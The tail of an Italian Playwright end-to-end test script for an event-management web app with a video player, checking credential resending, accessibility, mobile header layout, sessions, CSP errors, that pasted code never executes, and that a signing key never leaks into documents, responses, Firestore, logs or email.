        await aspetta(async () => (await (await rp(CHLOE2)).locator('.stato-email').textContent()) === 'da inviare', 5000, 'Chloé da inviare');
        vero(((await partecipante(CHLOE2)).invii[ID] || {}).stato === 'da inviare' && !(await partecipante(CHLOE)),
            'sul servizio: email nuova, credenziali «da inviare», il vecchio indirizzo non porta più a nessuno');
        await (await rp(CHLOE2)).locator('button[data-op="reinvia"]').click();
        await confermaDialogo(/credenziali.*chloe\.dupont@dupont\.example/s);
        await aspetta(async () => (await (await rp(CHLOE2)).locator('.stato-email').textContent()) === 'inviata', 20000, 'credenziali a Chloé');
        const letteraChloe = postaPer(CHLOE2, 'credenziali');
        const pwChloe = letteraChloe.length ? passwordDa(letteraChloe[0]) : '';
        vero(letteraChloe.length === 1 && letteraChloe[0].testo.indexOf('scrivi la tua email ' + CHLOE2 + ' e questa password: ' + pwChloe) >= 0,
            '«Invia ora»: le credenziali partono al nuovo indirizzo, con la nuova email');
        const entraChloe = await api('diretta-accesso', { azione: 'entra', email: 'Chloe.Dupont@Dupont.example', password: pwChloe });
        vero(entraChloe.stato === 200 && entraChloe.dati.email === CHLOE2, 'e con l\'email nuova e la password dell\'email Chloé entra davvero');

        /* ---------- 10. accessibilita' e tastiera ---------- */
        console.log('\n-- accessibilità');
        const senzaNome = await page.evaluate(() => {
            const out = [];
            document.querySelectorAll('input, select, textarea').forEach(n => {
                if (n.type === 'hidden') return;
                const etichetta = n.getAttribute('aria-label') || (n.id && document.querySelector('label[for="' + n.id + '"]')) || n.closest('label');
                if (!etichetta) out.push(n.id || n.className || n.name);
            });
            return out;
        });
        vero(senzaNome.length === 0, 'ogni campo ha un\'etichetta', senzaNome.join(', '));
        await $('#tab-evento').click();
        await $('#tab-evento').focus();
        await page.keyboard.press('ArrowRight');
        vero(await $('#tab-regia').getAttribute('aria-selected') === 'true' && await page.evaluate(() => document.activeElement.id) === 'tab-regia', 'schede: le frecce spostano la scheda attiva (role="tab")');
        await page.keyboard.press('End');
        vero(await $('#tab-esporta').getAttribute('aria-selected') === 'true', 'schede: Fine porta all\'ultima');

        /* ---------- 10b. la testata sul telefono ----------
           Sul telefono la testata (che resta in cima scorrendo) e' compatta: una
           riga con marchio, stato e pulsanti piccoli, il menu degli eventi a tutta
           larghezza su una riga sua, le schede che scorrono con un indizio. */
        console.log('\n-- testata sul telefono');
        const misuraTestata = () => page.evaluate(() => {
            const r = s => document.querySelector(s).getBoundingClientRect();
            const t = r('.testata'), sel = r('#sel-evento'), pil = r('#stato-testata'), nuovo = r('#btn-nuovo-evento'), esci = r('#btn-gestore-esci');
            const s = document.querySelector('.schede');
            const scelta = document.querySelector('.schede [aria-selected="true"]').getBoundingClientRect();
            const c = s.getBoundingClientRect();
            const centro = b => b.top + b.height / 2;
            return {
                altezza: Math.round(t.height), finestra: window.innerWidth, selLargo: Math.round(sel.width),
                selSotto: sel.top >= Math.max(pil.bottom, nuovo.bottom, esci.bottom) - 1,
                unaRiga: [pil, nuovo].every(b => Math.abs(centro(b) - centro(esci)) < 4),
                bottoni: Math.round(Math.max(nuovo.height, esci.height)),
                titolo: r('.testata-titolo').width > 1,
                orizzontale: document.documentElement.scrollWidth > window.innerWidth,
                sceltaInVista: scelta.left >= c.left - 1 && scelta.right <= c.right + 1,
                classi: document.querySelector('.testata').className,
                sfumatura: getComputedStyle(s).webkitMaskImage || getComputedStyle(s).maskImage || 'none',
                freccia: getComputedStyle(document.querySelector('.testata'), '::after').content
            };
        });
        const alComputer = await misuraTestata();
        await page.setViewportSize({ width: 390, height: 844 });
        await pausa(400);
        const a390 = await misuraTestata();
        vero(a390.altezza <= 150, '390px: testata compatta, alta ' + a390.altezza + 'px (prima era 212)');
        vero(a390.selSotto && a390.selLargo >= a390.finestra - 32, 'il menu degli eventi sta su una riga sua, largo quanto lo schermo (' + a390.selLargo + 'px): il titolo non è più tagliato');
        vero(a390.unaRiga && a390.bottoni <= 36, 'stato, «Nuovo evento» ed «Esci» su una riga, pulsanti più piccoli (' + a390.bottoni + 'px)');
        vero(!a390.orizzontale && a390.sceltaInVista, 'niente scorrimento orizzontale della pagina, la scheda scelta si vede');
        await page.screenshot({ path: path.join(FOTO, 'telefono-testata-390.png'), clip: { x: 0, y: 0, width: 390, height: 320 } });
        await page.setViewportSize({ width: 360, height: 780 });
        await pausa(400);
        const a360 = await misuraTestata();
        vero(/altre-a-sinistra/.test(a360.classi) && !/altre-a-destra/.test(a360.classi) && a360.sceltaInVista && a360.sfumatura !== 'none' && a360.freccia === 'none',
            '360px: le schede scorrono; con «Esporta» scelta la riga va in fondo e il bordo sinistro sfuma (altre schede prima)', JSON.stringify(a360));
        await $('#tab-evento').click();
        await pausa(300);
        const b360 = await misuraTestata();
        vero(/altre-a-destra/.test(b360.classi) && b360.sceltaInVista && b360.sfumatura !== 'none' && /›/.test(b360.freccia),
            'scelta «Evento», la riga torna all\'inizio: sfumatura e freccia «›» sul bordo destro dicono che ci sono altre schede', JSON.stringify(b360));
        await page.screenshot({ path: path.join(FOTO, 'telefono-testata-360.png'), clip: { x: 0, y: 0, width: 360, height: 300 } });
        await page.setViewportSize({ width: 1440, height: 900 });
        await pausa(400);
        const dopo = await misuraTestata();
        vero(dopo.altezza === alComputer.altezza && dopo.titolo && !/altre-a-/.test(dopo.classi) && dopo.selLargo < 600,
            'sul computer la testata resta com\'era (alta ' + dopo.altezza + 'px, con il titolo, senza indizi)');

        /* ---------- 11. la sessione resta, poi si esce ---------- */
        console.log('\n-- sessione');
        await page.reload();
        await $('#vista-app').waitFor({ state: 'visible', timeout: 20000 });
        // la gestione si mostra subito e l'elenco degli eventi arriva un attimo dopo dal servizio
        const sceltoDopoRicarica = await aspetta(async () => await $('#sel-evento').inputValue() === ID, 10000, 'evento scelto dopo la ricarica').catch(() => false);
        vero(await testo('#gestore-connesso') === EMAIL_GESTORE && sceltoDopoRicarica, 'ricaricando la pagina la sessione resta aperta e l\'evento resta scelto',
            await $('#sel-evento').inputValue());
        await $('#btn-gestore-esci').click();
        await $('#form-gestore').waitFor({ state: 'visible', timeout: 10000 });
        vero(true, '«Esci»: di nuovo alla schermata di accesso');

        /* ---------- 12. errori della pagina e del servizio ---------- */
        const csp = await page.evaluate(() => window.__violazioniCSP);
        vero(csp.length === 0, 'nessuna violazione della Content-Security-Policy', csp.join('\n'));
        vero(erroriPagina.length === 0, 'nessun errore JavaScript nella pagina', erroriPagina.join('\n'));
        /* attesi: le risposte 4xx provocate apposta (password sbagliata, non
           gestore, reinvio entro un minuto, email gia' usata), le richieste di
           'crea' interrotte apposta (rete caduta) e, dalla web TV di prova, i
           flussi che non rispondono apposta (404) e le letture che il browser
           blocca per il CORS mancante (/senza-cors/) */
        const dallaWebTv = e => e.url.startsWith(WEBTV) || e.testo.includes(WEBTV);
        const inattesi = erroriConsole.filter(e => !/Failed to load resource: the server responded with a status of (400|401|403|409)/.test(e.testo)
            && !/Failed to load resource: net::ERR_(CONNECTION_RESET|INTERNET_DISCONNECTED)/.test(e.testo)
            && !(dallaWebTv(e) && /status of (404|503)|CORS policy|net::ERR_FAILED/.test(e.testo)));
        vero(inattesi.length === 0, 'nessun errore inatteso nella console', inattesi.map(e => e.testo + ' (' + e.url + ')').join('\n'));
        uscitaServer.push(server.tuttaUscita);
        /* Le prove non usano MAI la rete vera di Azoto: dal browser, ogni
           richiesta verso Azoto e' andata al player finto (instradaAzoto);
           verso gli altri indirizzi di azotosolutions.com e verso i siti del
           codice malevolo non ne e' partita nessuna. */
        const versoAzoto = tutteLeRichieste.filter(u => /azotosolutions\.com/.test(u));
        vero(versoAzoto.length > 0 && versoAzoto.length === intercettateAzoto && versoAzoto.every(u => u.startsWith(AZOTO + '/cloudtv/'))
            && bloccate.length === 0 && !tutteLeRichieste.some(u => RE_RICHIESTE_VIETATE.test(u)),
            'niente rete vera di Azoto: le ' + versoAzoto.length + ' richieste del browser verso Azoto le ha servite tutte il player finto (cdn.azotosolutions.com/cloudtv/…); nessuna verso altri indirizzi di Azoto (azoto-player.js) o verso i siti del codice malevolo',
            versoAzoto.length + ' richieste, ' + intercettateAzoto + ' passate dal player finto; ' + versoAzoto.filter(u => !u.startsWith(AZOTO + '/cloudtv/')).concat(bloccate).join(' '));
        vero(await page.evaluate(() => typeof window.__attacco) === 'undefined', 'alla fine della prova window.__attacco è ancora undefined: nessun pezzo dei codici incollati è mai stato eseguito');

        /* ---------- 12b. il documento pubblico e la chiave dei link firmati ---------- */
        smettiDiGuardare();
        smettiDiGuardare = null;
        /* Le regole del documento pubblico (lo leggono tutti gli iscritti):
           tipoPlayer sempre; l'indirizzo di Azoto o i link del flusso SOLO in
           videoId/videoRiserva, SOLO in onda e SOLO quelli della modalita' in
           uso (con Azoto niente riserva ne' firma; con il flusso solo
           .m3u8/.mpd); mai azotoUrl, videoUrl, riservaUrl, la firma o la
           chiave; mai HTML. */
        const regolaInfranta = d => {
            if (d.erroreAscolto) return 'ascolto: ' + d.erroreAscolto;
            const j = JSON.stringify(d);
            if (j.includes(SEGRETO)) return 'la chiave';
            if (/[<>]/.test(j)) return 'HTML';
            const vietati = ['azotoUrl', 'videoUrl', 'riservaUrl', 'riservaId', 'firma'].filter(k => k in d);
            if (vietati.length) return 'campi riservati: ' + vietati.join(', ');
            if (d.tipoPlayer !== 'azoto' && d.tipoPlayer !== 'flusso') return 'tipoPlayer ' + d.tipoPlayer;
            if (/azotosolutions|prova\.test/.test(JSON.stringify(Object.assign({}, d, { videoId: '', videoRiserva: '' })))) return 'un indirizzo fuori da videoId/videoRiserva';
            if (d.stato !== 'in_onda' && (d.videoId || d.videoRiserva || d.videoFirmato)) return 'un indirizzo fuori onda (' + d.stato + ')';
            if (d.tipoPlayer === 'azoto') {
                if (d.videoRiserva || d.videoFirmato) return 'la riserva o la firma con il player Azoto';
                if (d.videoId && !V.eAzoto(d.videoId)) return 'con il player Azoto un videoId che non è di Azoto';
                return '';
            }
            const diFlusso = x => !x || V.tipoDi(x) === 'hls' || V.tipoDi(x) === 'dash';
            return diFlusso(d.videoId) && diFlusso(d.videoRiserva) ? '' : 'con il flusso diretto un link che non è un flusso';
        };
        const fuoriRegola = versioniPubblico.map(d => ({ d: d, perche: regolaInfranta(d) })).filter(x => x.perche);
        const conAzoto = versioniPubblico.filter(d => d.tipoPlayer === 'azoto' && d.videoId);
        const conFlusso = versioniPubblico.filter(d => d.tipoPlayer === 'flusso' && d.videoId);
        const passaggi = versioniPubblico.map(d => d.tipoPlayer).filter((t, i, a) => i === 0 || t !== a[i - 1]);
        vero(versioniPubblico.length >= 15 && conAzoto.length >= 4 && conFlusso.length >= 6 && fuoriRegola.length === 0,
            'il documento pubblico eventi/' + ID + ', seguito per tutta la prova (' + versioniPubblico.length + ' versioni, ' + conAzoto.length + ' con il player Azoto, ' + conFlusso.length + ' con il flusso): gli indirizzi solo in videoId/videoRiserva, solo in onda e solo della modalità in uso; mai azotoUrl/videoUrl/riservaUrl/firma, mai la chiave, mai HTML',
            JSON.stringify(fuoriRegola.slice(0, 2).map(x => x.perche + ': ' + JSON.stringify(x.d).slice(0, 300))));
        vero(passaggi.join(' ') === 'azoto flusso azoto flusso', 'e il tipo di player che hanno ricevuto i partecipanti: ' + passaggi.join(' -> ') + ' (A, B dalla regia, di nuovo A, B dalla scheda Evento)');
        const conChiave = risposteServizio.filter(x => String(x.corpo || '').includes(SEGRETO));
        vero(risposteServizio.length > 50 && risposteServizio.filter(x => x.corpo === null).length === 0 && conChiave.length === 0,
            'la chiave dei link firmati non torna in nessuna delle ' + risposteServizio.length + ' risposte del servizio alla pagina (lette tutte, per intero)', conChiave.map(x => x.azione).join(', '));
        const raccolte = await db.listCollections();
        const doveChiave = [];
        for (const c of raccolte) {
            (await c.get()).docs.forEach(d => { if (JSON.stringify(d.data()).includes(SEGRETO)) doveChiave.push(c.id + '/' + d.id); });
        }
        vero(doveChiave.length === 0, 'la chiave non è in nessun documento di Firestore (' + raccolte.length + ' raccolte; tolta la firma, nemmeno in eventiRiservati)', doveChiave.join(', '));
        vero(uscitaServer.join('\n').length > 0 && !uscitaServer.join('\n').includes(SEGRETO) && !fs.readFileSync(POSTA, 'utf8').includes(SEGRETO),
            'la chiave non è nei log del servizio (tutta l\'uscita di server-locale.js, ' + uscitaServer.length + ' avvii) né nella posta');
        const guasti = uscitaServer.join('\n').split('\n').filter(r => /\[server-locale\]|Errore non gestito|TypeError|ReferenceError/.test(r));
        vero(guasti.length === 0, 'nessun errore non gestito nelle funzioni del servizio', guasti.slice(0, 5).join('\n'));
        const tuttaLaPosta = JSON.stringify(leggiPosta().filter(m => m.tipo !== 'credenziali' && m.tipo !== 'prova-credenziali').map(m => m.testo));
        vero(!/Password:\s*\S/.test(tuttaLaPosta), 'nessuna password nelle email che non sono di credenziali (promemoria, reimpostazione, «Sei iscritto anche a…»)');
        const conNomeUtente = leggiPosta().filter(m => /nome utente/i.test(m.oggetto + m.testo + m.html));
        vero(leggiPosta().length >= 30 && conNomeUtente.length === 0, 'in nessuna delle ' + leggiPosta().length + ' email compare un «nome utente»', conNomeUtente.map(m => m.tipo).join(', '));
    } catch (e) {
        rossi++;
        console.log('ROSSO la prova si è interrotta: ' + (e && e.stack || e));
        if (paginaAperta) {
            // com'era la pagina in quel momento: una foto e i messaggi visibili
            await paginaAperta.screenshot({ path: path.join(RISULTATI, 'gestione-interrotta.png') }).catch(() => {});
            const messaggi = await paginaAperta.evaluate(() => Array.from(document.querySelectorAll('.msg:not([hidden]), .link-tipo:not([hidden]), .esito-prova:not([hidden])'))
                .map(n => '#' + n.id + ': ' + n.textContent.trim().slice(0, 300))).catch(() => []);
            console.log('--- messaggi visibili nella pagina (foto in risultati/gestione-interrotta.png) ---\n' + messaggi.join('\n'));
            if (erroriPaginaAperta.length) console.log('--- errori JavaScript della pagina ---\n' + erroriPaginaAperta.join('\n'));
        }
        if (server && server.uscita) console.log('--- ultime righe del servizio ---\n' + server.uscita.slice(-3000));
    } finally {
        if (smettiDiGuardare) smettiDiGuardare();
        if (browser) await browser.close().catch(() => {});
        if (trasmissione) trasmissione.ferma();
        await ferma(server);
        await ferma(emulatori);
    }
    console.log('\n' + verdi + ' verdi, ' + rossi + ' rossi (' + Math.round((Date.now() - t0) / 1000) + ' s)');
    console.log('screenshot in ' + path.relative(process.cwd(), FOTO) + ' e ' + path.relative(process.cwd(), FOTO_AZOTO));
    process.exit(rossi ? 1 : 0);
})();
